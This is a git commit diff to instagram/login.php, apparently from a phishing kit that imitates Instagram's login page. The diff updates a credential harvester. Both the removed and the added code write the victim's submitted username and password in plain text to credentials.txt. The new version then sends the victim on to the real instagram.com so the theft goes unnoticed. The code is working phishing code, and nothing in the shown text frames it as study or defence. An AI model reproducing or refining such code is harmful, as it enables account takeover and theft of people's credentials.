b6f483643e817c75fe5ebb25956841e8a70b6697
kipkorirCal <kipkoric@mail.gvsu.edu>
2025-04-12 19:15:49 -0400

    Update login.php

--- instagram/login.php
+++ instagram/login.php
@@ -1,5 +1,16 @@
 <?php
-file_put_contents("credentials.txt", "User: " . $_POST['username'] . " | Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://twitter.com');
-exit();
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $username = htmlspecialchars($_POST['username']);
+    $password = htmlspecialchars($_POST['password']);
+
+    $entry = "Instagram | Username: $username | Password: $password" . PHP_EOL;
+    file_put_contents("credentials.txt", $entry, FILE_APPEND | LOCK_EX);
+
+    // Redirect to real Instagram
+    header("Location: https://instagram.com");
+    exit();
+} else {
+    header("Location: index.html");
+    exit();
+}
 ?>
